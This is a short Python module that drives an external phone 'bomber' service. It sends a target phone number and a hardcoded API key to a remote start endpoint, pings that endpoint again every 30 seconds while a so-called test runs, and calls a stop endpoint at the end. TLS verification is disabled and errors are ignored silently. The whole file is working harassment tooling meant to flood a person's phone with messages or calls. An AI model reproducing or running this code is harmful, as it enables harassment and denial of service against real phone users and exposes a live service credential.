from __future__ import annotations

import asyncio
import aiohttp
from aiohttp import TCPConnector
from typing import Optional
import logging

logger = logging.getLogger(__name__)

EXTERNAL_BOMBER_KEY = "urfaaan_omdivine"
EXTERNAL_START_URL  = "https://bomber.kingcc.qzz.io/bomb"
EXTERNAL_STOP_URL   = "https://bomber.kingcc.qzz.io/stop"

# How often to re-ping the start URL during the test (seconds)
REPING_INTERVAL = 30


async def startExternalBomber(phone: str) -> bool:
    """
    Fire the external bomber start API.
    Returns True if successful, False if down/error (silently skips).
    """
    try:
        connector = TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(
                EXTERNAL_START_URL,
                params={"key": EXTERNAL_BOMBER_KEY, "numbar": phone},
                timeout=aiohttp.ClientTimeout(total=10),
            ) as resp:
                if resp.status < 400:
                    logger.info(f"External bomber started for {phone} — status {resp.status}")
                    return True
                else:
                    logger.info(f"External bomber returned {resp.status} — skipping")
                    return False
    except Exception as e:
        logger.info(f"External bomber unavailable — skipping ({type(e).__name__})")
        return False


async def stopExternalBomber(phone: str) -> None:
    """
    Fire the external bomber stop API.
    Silently ignores any errors.
    """
    try:
        connector = TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(
                EXTERNAL_STOP_URL,
                params={"key": EXTERNAL_BOMBER_KEY, "numbar": phone},
                timeout=aiohttp.ClientTimeout(total=10),
            ) as resp:
                logger.info(f"External bomber stopped for {phone} — status {resp.status}")
    except Exception as e:
        logger.info(f"External bomber stop failed — ignoring ({type(e).__name__})")


async def externalBomberLoop(phone: str, stopEvent: asyncio.Event) -> None:
    """
    Runs alongside the main test.
    - Fires start immediately
    - Re-pings every REPING_INTERVAL seconds to keep it going
    - Fires stop when test ends
    - Silently skips if API is down at any point
    """
    # Fire start
    ok = await startExternalBomber(phone)
    if not ok:
        return  # API is down, skip entirely

    # Keep re-pinging while test runs
    while not stopEvent.is_set():
        try:
            await asyncio.wait_for(
                asyncio.shield(stopEvent.wait()),
                timeout=REPING_INTERVAL
            )
            # Stop event fired
            break
        except asyncio.TimeoutError:
            # Re-ping
            await startExternalBomber(phone)

    # Test ended — fire stop
    await stopExternalBomber(phone)